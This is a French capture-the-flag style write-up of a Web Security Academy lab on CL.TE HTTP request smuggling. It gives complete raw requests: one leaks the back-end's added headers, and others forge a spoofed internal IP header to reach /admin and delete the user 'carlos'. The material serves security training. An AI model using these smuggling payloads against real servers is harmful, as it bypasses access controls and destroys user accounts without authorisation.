# Lab

https://0a720052049641ad83cd5fcd00840023.web-security-academy.net/

## Solution

Le serveur est vulnérable aux attaques CL.TE.

Cette requête permet de leak les headers rajoutés par le back-end sur les requêtes renvoyées :

```http
POST / HTTP/1.1
Host: 0a720052049641ad83cd5fcd00840023.web-security-academy.net
Cookie: session=3Jq3hn0UYcBbQA71N8lRaylEe16bXN3u
Content-Length: 128
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 250
Connection: close

search=coucou
```

Il faut ajuster le header `Content-Length` de la request smugglée pour que le back-end ne plante pas, ici `250`.

```html
<section class=blog-header>
    <h1>
        0 search results for 'coucouPOST / HTTP/1.1
        X-umaGCv-Ip: x.x.x.x
        Host: 0a720052049641ad83cd5fcd00840023.web-security-academy.net
        Cookie: session=3Jq3hn0UYcBbQA71N8lRaylEe16bXN3u
        Content-Length: 128
        Content-Type: application/x-www-form-urlencoded
        Transfer-Encoding: chunked

        0


        POST / HTTP/1.1
        Con'
    </h1>
</section>
```

Maintenant, avec le header leaké `X-umaGCv-Ip: x.x.x.x`, on peut construire une requête smugglée.

```http
POST / HTTP/1.1
Host: 0a720052049641ad83cd5fcd00840023.web-security-academy.net
Cookie: session=3Jq3hn0UYcBbQA71N8lRaylEe16bXN3u
Content-Length: 146
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST /admin HTTP/1.1
X-umaGCv-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close

x=1
```

```html
POST / HTTP/1.1
Host: 0a720052049641ad83cd5fcd00840023.web-security-academy.net
Cookie: session=3Jq3hn0UYcBbQA71N8lRaylEe16bXN3u
Content-Length: 169
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST /admin/delete?username=carlos HTTP/1.1
X-umaGCv-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close

x=1
```